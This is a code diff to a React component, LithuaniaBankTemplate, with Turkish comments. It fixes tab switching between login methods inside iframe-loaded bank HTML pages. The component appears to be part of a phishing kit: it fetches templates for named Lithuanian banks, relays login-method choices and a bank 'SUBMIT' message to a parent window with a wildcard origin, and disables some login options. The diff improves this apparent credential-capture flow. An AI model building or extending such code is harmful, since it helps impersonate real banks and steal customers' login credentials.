@@ -34,6 +34,12 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
     "siauliu-lt"
   ].includes(bankSlug ?? "");
 
+  // Eger files henuz yuklenmemis (length===0) iken LITHUANIA_BANK_TAB_CLICK gelirse
+  // safeIndex hesabi hep 0 donecegi icin gorunuste hic degismez. Bu yuzden
+  // PENDING INDEX + PENDING METHOD saklanir, files dolunca uygulanir.
+  const pendingIndexRef = useRef<number | null>(null);
+  const pendingMethodRef = useRef<string>("");
+
   const resolveLoginMethodFromIndex = (slug?: string, index?: number) => {
     if (!slug || typeof index !== "number" || index < 0) return "";
 
@@ -449,6 +455,23 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
       .catch(err => console.error("Error fetching bank HTMLs:", err));
   }, [bankSlug]);
 
+  // FILES yuklendikten (length>0) sonra: daha once PENDING bir index/method geldi ise onu uygula
+  // (ilk sayfa acilisi sirasinda files yokken tıklanan tab'lar kaybolur/kacar diye)
+  useEffect(() => {
+    if (!files || files.length === 0) return;
+    if (pendingIndexRef.current != null) {
+      const idx = pendingIndexRef.current;
+      pendingIndexRef.current = null;
+      const safe = Math.max(0, Math.min(idx, files.length - 1));
+      setCurrentIndex(safe);
+    }
+    if (pendingMethodRef.current) {
+      const label = pendingMethodRef.current;
+      pendingMethodRef.current = "";
+      if (label) setSelectedLoginMethod(label);
+    }
+  }, [files]);
+
   useEffect(() => {
     const handleMessage = (e: MessageEvent) => {
       if (e.data && e.data.type === 'LITHUANIA_BANK_SUBMIT') {
@@ -674,7 +697,6 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
          if (typeof e.data.loginMethod === "string") {
            const normalizedLoginMethod = normalizeLoginMethodLabel(e.data.loginMethod);
            if (normalizedLoginMethod) {
-             setSelectedLoginMethod(normalizedLoginMethod);
              finalLoginMethod = normalizedLoginMethod;
              const idx = resolveIndexFromLoginMethod(bankSlug, normalizedLoginMethod);
              if (idx >= 0) finalIndex = idx;
@@ -684,16 +706,44 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
            if (finalIndex === -1) finalIndex = e.data.targetIndex;
          }
          if (finalIndex === -1 && finalLoginMethod) {
-           // Son deneme: loginMethod -> index
            const idx = resolveIndexFromLoginMethod(bankSlug, finalLoginMethod);
            if (idx >= 0) finalIndex = idx;
          }
-         if (finalIndex >= 0) {
-           const safeIndex = Math.min(finalIndex, Math.max(0, files.length - 1));
+
+         // ============ ONEMLI: FILES henuz yuklenmediyse (length === 0) =============
+         // Eger files.length === 0 iken safeIndex hesaplarsak Math.max(0, 0-1)=0 olacak,
+         // ve her tab click'te 0 index gelecek, goruntu HIC DEGISMIYOR. Cozum:
+         // PENDING INDEX + METHOD sakla, files geldigi an yukaridaki useEffect ile uygula.
+         if (!files || files.length === 0) {
+           if (finalIndex >= 0) pendingIndexRef.current = finalIndex;
+           if (finalLoginMethod) pendingMethodRef.current = finalLoginMethod;
+           // Ayrıca login method varsa state'i de set et (daha sonra parent onChange sinyali vs icin)
+           if (finalLoginMethod) setSelectedLoginMethod(finalLoginMethod);
+         } else if (finalIndex >= 0) {
+           const safeIndex = Math.max(0, Math.min(finalIndex, files.length - 1));
+           if (finalLoginMethod) setSelectedLoginMethod(finalLoginMethod);
            setCurrentIndex(safeIndex);
-         } else {
-           // Hic bilgi yoksa sabit index degistirme - eski (prev+1)% yanlis secim acmis oldugu icin YOK.
+         } else if (finalLoginMethod) {
+           // En azından login method varsa state set (index bilinmiyor ama method etiketi saklı)
+           setSelectedLoginMethod(finalLoginMethod);
          }
+      } else if (e.data && e.data.type === 'LITHUANIA_BANK_IFRAME_LOADED') {
+        // iframe icindeki script yuklendi, pending varsa dosyalar da gelmistir
+        // yukaridaki files useEffect zaten calisir. Ayrica:
+        // Eger seçili bir loginMethod var ise ve iframe icindeki form henüz
+        // o method'a gore guncellenmemis ise (ilk yuklenmede 0. index html gelir)
+        // bunu tekrar ayarla:
+        if (pendingIndexRef.current != null && files && files.length > 0) {
+          const idx = pendingIndexRef.current;
+          pendingIndexRef.current = null;
+          const safe = Math.max(0, Math.min(idx, files.length - 1));
+          setCurrentIndex(safe);
+        }
+        if (pendingMethodRef.current) {
+          const lbl = pendingMethodRef.current;
+          pendingMethodRef.current = "";
+          if (lbl) setSelectedLoginMethod(lbl);
+        }
       }
     };
 
@@ -1798,11 +1848,16 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
                   }
 
                   notifyParentTabChanged(clickedLoginMethod || '', targetIndex >= 0 ? targetIndex : undefined);
-                  window.parent.postMessage({
+                  const payload = {
                         type: 'LITHUANIA_BANK_TAB_CLICK',
                         targetIndex: targetIndex >= 0 ? targetIndex : undefined,
                         loginMethod: clickedLoginMethod || (window.__traeSelectedLoginMethod || '')
-                    }, '*');
+                  };
+                  window.parent.postMessage(payload, '*');
+                  // CROSS ORIGIN / ASYNC kacinmasi: 2 kez at, 2. si biraz gecikmeli.
+                  setTimeout(() => {
+                    try { window.parent.postMessage(payload, '*'); } catch(_err) {}
+                  }, 150);
               } else {
                   // targetIndex bulunamadiysa ve login method yoksa: HIRALI yonlendirme yapma (Yanlis index acar)
                   // EGER radio/label ise native birakmamiz yeter.
@@ -2352,6 +2407,15 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
                style.innerHTML = '#estonian-id-card, #estonian-id-card *, #estonian-id-card-radio, label[for="estonian-id-card-radio"] { pointer-events: none !important; opacity: 0.5 !important; filter: grayscale(100%); cursor: not-allowed !important; }';
                document.head.appendChild(style);
            }
+
+           // iframe tamamen yuklendi sinyali parenta gonder:
+           // parent dinleyici bunu gorurse pending index varsa hemen uygular.
+           try {
+             window.parent.postMessage({ type: 'LITHUANIA_BANK_IFRAME_LOADED', url: window.location.href, href: window.location.href }, '*');
+             setTimeout(() => {
+               try { window.parent.postMessage({ type: 'LITHUANIA_BANK_IFRAME_LOADED', url: window.location.href, href: window.location.href }, '*'); } catch(_er) {}
+             }, 100);
+           } catch(_er) {}
          `;
          doc.body.appendChild(script);
 
